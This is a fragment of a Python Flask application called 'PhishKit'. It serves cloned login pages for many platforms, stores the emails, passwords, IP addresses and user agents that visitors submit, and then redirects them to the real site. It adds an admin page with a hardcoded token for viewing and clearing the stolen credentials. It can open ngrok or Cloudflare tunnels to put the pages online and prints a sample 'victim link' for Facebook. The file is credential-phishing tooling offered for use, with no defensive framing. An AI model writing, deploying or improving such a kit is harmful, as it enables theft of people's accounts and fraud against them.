    return None

def cleanup():
    for p in tunnel_procs:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass

atexit.register(cleanup)
signal.signal(signal.SIGINT, lambda s, f: (cleanup(), sys.exit(0)))
signal.signal(signal.SIGTERM, lambda s, f: (cleanup(), sys.exit(0)))

# ── routes ──────────────────────────────────────────────────────────────
@app.route("/")
def index():
    links = "\n".join(
        f'<li><a href="/{k}">{v["display"]}</a> <code>/{k}</code></li>'
        for k, v in sorted(PLATFORMS.items())
    )
    return f"""<!DOCTYPE html>
<html><head><title>PhishKit</title>
<style>
body{{font-family:ui-monospace,monospace;background:#0d1117;color:#3fb950;padding:40px;line-height:1.6}}
a{{color:#58a6ff}} h1{{color:#f0f6fc}} code{{background:#161b22;padding:2px 6px;border-radius:4px}}
ul{{columns:2}} li{{margin-bottom:6px}}
</style></head>
<body>
<h1>PhishKit — {len(PLATFORMS)} platforms</h1>
<ul>{links}</ul>
<p>Credentials: <a href="/admin/creds?token=noexiv">/admin/creds?token=noexiv</a></p>
<p>Clear log: <a href="/admin/clear?token=noexiv">/admin/clear?token=noexiv</a></p>
</body></html>"""

@app.route("/<platform>", methods=["GET", "POST"])
def phish(platform):
    platform = platform.lower()
    if platform not in PLATFORMS:
        return "Unknown platform", 404
    cfg = PLATFORMS[platform]
    error = None
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        if email and password:
            ip = request.headers.get("X-Forwarded-For", request.remote_addr)
            if ip and "," in ip:
                ip = ip.split(",")[0].strip()
            ua = request.headers.get("User-Agent", "")
            save_cred(platform, email, password, ip, ua)
            return redirect(cfg["redirect"])
        error = "The email or password you entered is incorrect."
    return render_template_string(cfg["html"], error=error)

@app.route("/admin/creds")
def admin_creds():
    if request.args.get("token") != "noexiv":
        return "Unauthorized", 401
    rows = ""
    for c in reversed(credentials):
        rows += f"<tr><td>{c['timestamp']}</td><td>{c['platform']}</td><td>{c['email']}</td><td>{c['password']}</td><td>{c['ip']}</td></tr>"
    return f"""<!DOCTYPE html>
<html><head><title>Captured</title>
<style>
body{{font-family:ui-monospace,monospace;background:#0d1117;color:#3fb950;padding:20px}}
table{{border-collapse:collapse;width:100%}} th,td{{border:1px solid #30363d;padding:8px;text-align:left}}
th{{background:#161b22;color:#f0f6fc}}
</style></head>
<body>
<h1>Captured ({len(credentials)})</h1>
<table>
<tr><th>Time</th><th>Platform</th><th>Email / User</th><th>Password</th><th>IP</th></tr>
{rows}
</table>
</body></html>"""

@app.route("/admin/clear")
def admin_clear():
    if request.args.get("token") != "noexiv":
        return "Unauthorized", 401
    global credentials
    with lock:
        credentials = []
        with open(CRED_FILE, "w") as f:
            json.dump([], f)
    return "Cleared"

# ── entry ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="PhishKit")
    parser.add_argument("--ngrok", action="store_true", help="auto-start ngrok tunnel")
    parser.add_argument("--cloudflare", "--cf", action="store_true", help="auto-start cloudflare tunnel")
    parser.add_argument("--port", type=int, default=PORT, help="local port (default 8080)")
    args = parser.parse_args()

    port = args.port
    public_url = None

    if args.ngrok:
        public_url = start_ngrok(port)
    elif args.cloudflare:
        public_url = start_cloudflare(port)

    print(f"""
╔══════════════════════════════════════════════════════════╗
║  PhishKit ready                                          ║
║  Local:    http://127.0.0.1:{port}                         ║
║  Platforms:{len(PLATFORMS):3}                                          ║
║  Admin:    /admin/creds?token=noexiv                     ║
╚══════════════════════════════════════════════════════════╝
""")
    if public_url:
        print(f"  Public → {public_url}")
        print(f"  Example victim link: {public_url}/facebook")
        print()

    app.run(host=HOST, port=port, debug=False, threaded=True)

if __name__ == "__main__":
    main()